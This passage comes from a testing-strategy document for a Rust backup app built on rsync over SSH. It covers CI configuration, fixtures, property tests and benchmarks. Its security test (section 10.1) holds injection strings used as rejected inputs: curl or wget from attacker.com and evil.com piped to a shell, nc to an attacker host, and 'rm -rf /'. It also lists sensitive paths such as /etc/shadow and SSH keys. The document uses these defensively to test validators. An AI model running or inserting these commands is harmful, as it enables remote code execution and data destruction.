    // Parse stdout to extract file list
    let files: Vec<&str> = mock.stdout.iter()
        .filter(|line| line.ends_with(".txt"))
        .map(|s| s.as_str())
        .collect();

    assert_eq!(files.len(), 2);
}
```

### 6.2 Time-Based Testing (Mock Clocks)

```rust
// tests/mocks/mock_clock.rs
use std::sync::{Arc, Mutex};
use chrono::{DateTime, Utc, Duration};

pub struct MockClock {
    current_time: Arc<Mutex<DateTime<Utc>>>,
}

impl MockClock {
    pub fn new(start: DateTime<Utc>) -> Self {
        Self {
            current_time: Arc::new(Mutex::new(start)),
        }
    }

    pub fn advance(&self, duration: Duration) {
        let mut time = self.current_time.lock().unwrap();
        *time = *time + duration;
    }

    pub fn now(&self) -> DateTime<Utc> {
        *self.current_time.lock().unwrap()
    }
}

// Usage in scheduler tests:
#[tokio::test]
async fn test_scheduler_with_mock_clock() {
    let clock = MockClock::new(Utc::now());

    // Schedule job for 1 hour from now
    let target_time = clock.now() + Duration::hours(1);

    // Advance clock by 1 hour
    clock.advance(Duration::hours(1));

    // Verify job would trigger now
    assert_eq!(clock.now(), target_time);
}
```

---

## 7. Test Infrastructure

### 7.1 GitHub Actions CI/CD

```yaml
# .github/workflows/rust-tests.yml
name: Rust Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

env:
  CARGO_TERM_COLOR: always

jobs:
  test:
    name: Test Suite
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        rust: [stable, beta, nightly]
        exclude:
          # Reduce matrix size
          - os: windows-latest
            rust: beta
          - os: windows-latest
            rust: nightly

    steps:
    - uses: actions/checkout@v3

    - name: Install Rust
      uses: actions-rs/toolchain@v1
      with:
        profile: minimal
        toolchain: ${{ matrix.rust }}
        override: true
        components: rustfmt, clippy

    - name: Cache dependencies
      uses: actions/cache@v3
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          src-tauri/target
        key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}

    - name: Run tests
      working-directory: src-tauri
      run: cargo test --verbose --all-features

    - name: Run clippy
      working-directory: src-tauri
      run: cargo clippy -- -D warnings

    - name: Check formatting
      working-directory: src-tauri
      run: cargo fmt -- --check

  coverage:
    name: Code Coverage
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3

    - name: Install Rust
      uses: actions-rs/toolchain@v1
      with:
        profile: minimal
        toolchain: stable
        override: true

    - name: Install tarpaulin
      run: cargo install cargo-tarpaulin

    - name: Generate coverage
      working-directory: src-tauri
      run: cargo tarpaulin --out Xml --output-dir ./coverage

    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        files: ./src-tauri/coverage/cobertura.xml
        fail_ci_if_error: true

  benchmarks:
    name: Performance Benchmarks
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3

    - name: Install Rust
      uses: actions-rs/toolchain@v1
      with:
        profile: minimal
        toolchain: stable
        override: true

    - name: Run benchmarks
      working-directory: src-tauri
      run: cargo bench --no-fail-fast

    - name: Store benchmark results
      uses: benchmark-action/github-action-benchmark@v1
      with:
        tool: 'cargo'
        output-file-path: src-tauri/target/criterion/*/base/estimates.json
        github-token: ${{ secrets.GITHUB_TOKEN }}
        auto-push: true

  security-audit:
    name: Security Audit
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3

    - name: Install cargo-audit
      run: cargo install cargo-audit

    - name: Run security audit
      working-directory: src-tauri
      run: cargo audit
```

### 7.2 Test Data Management

```rust
// tests/fixtures/mod.rs

use std::path::{Path, PathBuf};
use std::fs;
use tempfile::TempDir;

pub struct TestFixtures {
    pub temp_dir: TempDir,
}

impl TestFixtures {
    pub fn new() -> Self {
        Self {
            temp_dir: TempDir::new().unwrap(),
        }
    }

    pub fn create_sample_directory(&self) -> PathBuf {
        let sample = self.temp_dir.path().join("sample");
        fs::create_dir_all(&sample).unwrap();

        // Create predictable test structure
        fs::write(sample.join("file1.txt"), "content1").unwrap();
        fs::write(sample.join("file2.txt"), "content2").unwrap();

        let subdir = sample.join("subdir");
        fs::create_dir_all(&subdir).unwrap();
        fs::write(subdir.join("nested.txt"), "nested content").unwrap();

        sample
    }

    pub fn create_large_directory(&self, file_count: usize) -> PathBuf {
        let large = self.temp_dir.path().join("large");
        fs::create_dir_all(&large).unwrap();

        for i in 0..file_count {
            let file = large.join(format!("file_{:06}.txt", i));
            fs::write(&file, format!("content {}", i)).unwrap();
        }

        large
    }

    pub fn create_nested_structure(&self, depth: usize) -> PathBuf {
        let nested = self.temp_dir.path().join("nested");
        let mut current = nested.clone();

        fs::create_dir_all(&current).unwrap();

        for d in 0..depth {
            current = current.join(format!("level_{}", d));
            fs::create_dir_all(&current).unwrap();
            fs::write(current.join("file.txt"), format!("depth {}", d)).unwrap();
        }

        nested
    }
}

// Usage:
#[test]
fn test_with_fixtures() {
    let fixtures = TestFixtures::new();
    let sample_dir = fixtures.create_sample_directory();

    // Test using sample_dir
    assert!(sample_dir.join("file1.txt").exists());

    // Temp directory automatically cleaned up when fixtures drops
}
```

---

## 8. Recommended Test Files to Create

### Priority 1 (Security Critical)
1. ✅ `tests/path_validation_tests.rs` - Already exists
2. ✅ `tests/security_test_custom_command.rs` - Already exists
3. **NEW** `tests/security_penetration_tests.rs` - Comprehensive injection testing
4. **NEW** `tests/security_fuzzing.rs` - Fuzz testing for all validation functions

### Priority 2 (Core Functionality)
5. **NEW** `tests/rsync_service_tests.rs` - RSync argument building and process management
6. **NEW** `tests/index_service_tests.rs` - Database operations and FTS5 search
7. **NEW** `tests/job_scheduler_tests.rs` - Cron scheduling and job triggering
8. **NEW** `tests/integration_backup_flow.rs` - End-to-end backup and restore

### Priority 3 (Additional Coverage)
9. **NEW** `tests/snapshot_service_tests.rs` - Enhance existing tests
10. **NEW** `tests/manifest_service_tests.rs` - Manifest creation and parsing
11. **NEW** `tests/keychain_service_tests.rs` - Credential storage
12. **NEW** `tests/volume_watcher_tests.rs` - Mount detection

### Priority 4 (Performance & Load)
13. **NEW** `benches/comprehensive_benchmark.rs` - Enhanced performance suite
14. **NEW** `tests/load_tests.rs` - Stress testing with many concurrent operations
15. **NEW** `tests/memory_tests.rs` - Memory leak detection

---

## 9. Property-Based Testing

### 9.1 Using Proptest

Add to `Cargo.toml`:
```toml
[dev-dependencies]
proptest = "1.4"
```

### 9.2 Property Test Examples

```rust
// tests/property_tests.rs
use proptest::prelude::*;
use app_lib::utils::validation::*;

proptest! {
    // Property: Validation should never panic
    #[test]
    fn prop_validate_ssh_port_never_panics(s in "\\PC*") {
        let _ = validate_ssh_port(&s);
    }

    // Property: Valid ports should always parse to u16
    #[test]
    fn prop_valid_ports_parse_correctly(port in 1u16..=65535) {
        let port_str = port.to_string();
        let result = validate_ssh_port(&port_str);

        prop_assert!(result.is_ok());
        prop_assert_eq!(result.unwrap(), port);
    }

    // Property: Paths with null bytes should always fail
    #[test]
    fn prop_null_bytes_rejected(
        prefix in "[a-zA-Z0-9/]{0,50}",
        suffix in "[a-zA-Z0-9/]{0,50}"
    ) {
        let path_with_null = format!("{}\0{}", prefix, suffix);
        let result = validate_file_path(&path_with_null);

        prop_assert!(result.is_err());
    }

    // Property: Command substitution patterns should always fail
    #[test]
    fn prop_command_substitution_rejected(
        prefix in "[a-zA-Z0-9]{0,20}",
        command in "[a-zA-Z0-9]{1,20}",
        suffix in "[a-zA-Z0-9]{0,20}"
    ) {
        let patterns = vec![
            format!("{}$({}){}",prefix, command, suffix),
            format!("{}${{{}}}{}",prefix, command, suffix),
            format!("{}` {} `{}",prefix, command, suffix),
        ];

        for pattern in patterns {
            let result = validate_file_path(&pattern);
            prop_assert!(result.is_err(), "Should reject: {}", pattern);
        }
    }

    // Property: Hostname length must be <= 253 chars
    #[test]
    fn prop_hostname_length_limit(s in "[a-z]{254,}") {
        let result = validate_hostname(&s);
        prop_assert!(result.is_err());
    }

    // Property: Valid hostnames should be idempotent
    #[test]
    fn prop_hostname_validation_idempotent(s in "[a-z]{1,20}\\.[a-z]{2,10}") {
        let result1 = validate_hostname(&s);
        let result2 = validate_hostname(&s);

        prop_assert_eq!(result1.is_ok(), result2.is_ok());
    }
}
```

---

## 10. Example Test Implementations

### 10.1 Comprehensive Security Test

```rust
// tests/comprehensive_security_test.rs

#[cfg(test)]
mod comprehensive_security {
    use app_lib::utils::validation::*;
    use app_lib::security::PathValidator;
    use tempfile::TempDir;

    #[test]
    fn test_comprehensive_security_scenarios() {
        // SCENARIO 1: Prevent SSH command injection through port
        let malicious_ports = vec![
            "22; curl http://attacker.com/malware | sh",
            "22 -o ProxyCommand='nc attacker.com 1234'",
            "22$(wget http://evil.com -O /tmp/backdoor)",
        ];

        for port in malicious_ports {
            assert!(
                validate_ssh_port(port).is_err(),
                "Port injection should be blocked: {}",
                port
            );
        }

        // SCENARIO 2: Prevent path traversal to sensitive files
        let test_dir = TempDir::new().unwrap();
        let mut validator = PathValidator::new();
        validator.add_root(test_dir.path()).unwrap();

        let sensitive_paths = vec![
            "/etc/passwd",
            "/etc/shadow",
            "/var/log/auth.log",
            "/Users/victim/.ssh/id_rsa",
            "/root/.bash_history",
        ];

        for path in sensitive_paths {
            let result = validator.validate(path);
            assert!(
                result.is_err(),
                "Should block access to: {}",
                path
            );
        }

        // SCENARIO 3: Prevent identity file injection
        let malicious_identities = vec![
            "/home/user/.ssh/id_rsa; curl http://evil.com",
            "/path/to/key`whoami`",
            "/key$( rm -rf / )",
        ];

        for identity in malicious_identities {
            assert!(
                validate_file_path(identity).is_err(),
                "Identity file injection should be blocked: {}",
                identity
            );
        }

        // SCENARIO 4: Prevent proxy jump injection
        let malicious_proxies = vec![
            "user@jump.com; curl http://evil.com | bash",
            "user@jump.com | nc attacker.com 1234",
            "user@jump.com$(whoami)",
        ];

        for proxy in malicious_proxies {
            assert!(
                validate_proxy_jump(proxy).is_err(),
                "Proxy jump injection should be blocked: {}",
                proxy
            );
        }

        // SCENARIO 5: Verify legitimate usage works
        assert!(validate_ssh_port("22").is_ok());
        assert!(validate_ssh_port("2222").is_ok());
        assert!(validate_file_path("/home/user/.ssh/id_rsa").is_ok());
        assert!(validate_hostname("example.com").is_ok());
        assert!(validate_proxy_jump("user@bastion.example.com:2222").is_ok());

        println!("✅ All comprehensive security scenarios passed");
    }
}
```

### 10.2 Integration Test Example

```rust
// tests/integration_snapshot_lifecycle.rs

#[cfg(test)]
mod snapshot_lifecycle {
    use app_lib::services::{
        snapshot_service::SnapshotService,
        index_service::IndexService,
    };
    use tempfile::TempDir;
    use std::fs;

    #[test]
    fn test_snapshot_complete_lifecycle() {
        // Setup
        let source_dir = TempDir::new().unwrap();
        let dest_dir = TempDir::new().unwrap();
        let db_dir = TempDir::new().unwrap();

        // Create source files
        fs::write(source_dir.path().join("document.txt"), "Important data").unwrap();
        fs::write(source_dir.path().join("photo.jpg"), vec![0xFF, 0xD8, 0xFF]).unwrap();
        fs::create_dir_all(source_dir.path().join("folder")).unwrap();
        fs::write(source_dir.path().join("folder/nested.txt"), "Nested content").unwrap();

        // Simulate backup by copying files
        let snapshot_name = "2024-01-15-120000";
        let snapshot_path = dest_dir.path().join(snapshot_name);
        fs::create_dir_all(&snapshot_path).unwrap();

        // Copy files (in real scenario, rsync would do this)
        copy_dir_recursive(source_dir.path(), &snapshot_path).unwrap();

        // Step 1: List snapshots
        let snapshot_service = SnapshotService::new(db_dir.path());
        let snapshots = snapshot_service.list_snapshots(
            "test-job",
            dest_dir.path().to_str().unwrap(),
        ).unwrap();

        assert_eq!(snapshots.len(), 1);

        // Step 2: Index snapshot
        let index_service = IndexService::new(db_dir.path()).unwrap();
        let snapshot = &snapshots[0];
        index_service.index_snapshot(
            "test-job",
            snapshot.timestamp,
            &snapshot.path,
        ).unwrap();

        // Step 3: Verify file count
        let stats = index_service.get_snapshot_stats(
            "test-job",
            snapshot.timestamp,
        ).unwrap();

        assert_eq!(stats.file_count, 3); // document.txt, photo.jpg, nested.txt

        // Step 4: Search for files
        let search_results = index_service.search_files(
            "test-job",
            snapshot.timestamp,
            "document",
            10,
        ).unwrap();

        assert_eq!(search_results.len(), 1);
        assert_eq!(search_results[0].name, "document.txt");

        // Step 5: Get directory contents
        let root_contents = index_service.get_directory_contents(
            "test-job",
            snapshot.timestamp,
            "/",
        ).unwrap();

        assert_eq!(root_contents.len(), 3); // document.txt, photo.jpg, folder/

        println!("✅ Snapshot lifecycle test passed");
    }

    fn copy_dir_recursive(src: &std::path::Path, dst: &std::path::Path) -> std::io::Result<()> {
        fs::create_dir_all(dst)?;
        for entry in fs::read_dir(src)? {
            let entry = entry?;
            let src_path = entry.path();
            let dst_path = dst.join(entry.file_name());

            if src_path.is_dir() {
                copy_dir_recursive(&src_path, &dst_path)?;
            } else {
                fs::copy(&src_path, &dst_path)?;
            }
        }
        Ok(())
    }
}
```

### 10.3 Performance Benchmark Example

```rust
// benches/real_world_benchmark.rs

use criterion::{black_box, criterion_group, criterion_main, Criterion, Throughput};
use tempfile::TempDir;
use std::fs;

fn bench_real_world_macbook_backup(c: &mut Criterion) {
    use app_lib::services::index_service::IndexService;

    let mut group = c.benchmark_group("real_world_scenario");

    // Simulate a real MacBook backup structure
    let temp_dir = TempDir::new().unwrap();
    let db_dir = TempDir::new().unwrap();

    // Create realistic directory structure
    let home = temp_dir.path().join("Users").join("testuser");
    fs::create_dir_all(&home).unwrap();

    // Documents (1000 files)
    let documents = home.join("Documents");
    fs::create_dir_all(&documents).unwrap();
    for i in 0..1000 {
        fs::write(documents.join(format!("doc_{:04}.pdf", i)), vec![0; 1024]).unwrap();
    }

    // Photos (5000 files)
    let photos = home.join("Pictures");
    fs::create_dir_all(&photos).unwrap();
    for i in 0..5000 {
        fs::write(photos.join(format!("IMG_{:04}.jpg", i)), vec![0xFF; 2048]).unwrap();
    }

    // Code projects (10,000 small files)
    let projects = home.join("Projects");
    fs::create_dir_all(&projects).unwrap();
    for i in 0..100 {
        let project = projects.join(format!("project_{}", i));
        fs::create_dir_all(&project).unwrap();
        for j in 0..100 {
            fs::write(project.join(format!("file_{}.ts", j)), "console.log('hello');").unwrap();
        }
    }

    let total_files = 1000 + 5000 + 10000;

    let service = IndexService::new(db_dir.path()).unwrap();

    group.throughput(Throughput::Elements(total_files));
    group.sample_size(10); // Fewer samples for long benchmark

    group.bench_function("index_macbook_backup", |b| {
        b.iter(|| {
            let _ = service.delete_snapshot("macbook-backup", 12345);
            service.index_snapshot(
                black_box("macbook-backup"),
                black_box(12345),
                black_box(temp_dir.path().to_str().unwrap()),
            ).unwrap()
        });
    });

    group.finish();
}

criterion_group!(benches, bench_real_world_macbook_backup);
criterion_main!(benches);
```

---

## Summary and Next Steps

### Immediate Actions (Week 1)
1. ✅ Review existing tests (DONE - this document)
2. 🔨 Add `tests/security_penetration_tests.rs` (High Priority)
3. 🔨 Add `tests/rsync_service_tests.rs` (High Priority)
4. 🔨 Add `tests/index_service_tests.rs` (High Priority)
5. 📊 Set up GitHub Actions CI/CD pipeline

### Short Term (Week 2-3)
6. 🔨 Add integration tests for backup flow
7. 🔨 Add job scheduler tests
8. 📈 Enhance benchmark suite
9. 🐛 Add property-based fuzzing tests
10. 📝 Document test coverage metrics

### Medium Term (Month 1-2)
11. 🔍 Add load testing and stress tests
12. 💾 Add memory profiling tests
13. 🔄 Add concurrency tests
14. 🛡️ Add TOCTOU race condition tests
15. 📊 Achieve >80% test coverage

### Long Term (Month 3+)
16. 🤖 Automate security scanning (cargo-audit, clippy)
17. 📈 Performance regression tracking
18. 🔬 Continuous fuzzing with cargo-fuzz
19. 🏆 Achieve >90% test coverage
20. 📚 Maintain test documentation

---

## Code Coverage Targets

| Component | Current | Target | Priority |
|-----------|---------|--------|----------|
| `validation.rs` | ~95% | >95% | ✅ Maintain |
| `path_validation.rs` | ~90% | >95% | 🔨 Improve |
| `rsync_service.rs` | ~30% | >80% | 🚨 Critical |
| `index_service.rs` | ~40% | >85% | 🚨 Critical |
| `snapshot_service.rs` | ~85% | >90% | 🔨 Improve |
| `job_scheduler.rs` | ~20% | >75% | 🚨 Critical |
| **Overall** | **~60%** | **>80%** | **In Progress** |

---

**Last Updated:** 2024-12-04
**Version:** 1.0
**Author:** Testing Strategy Team
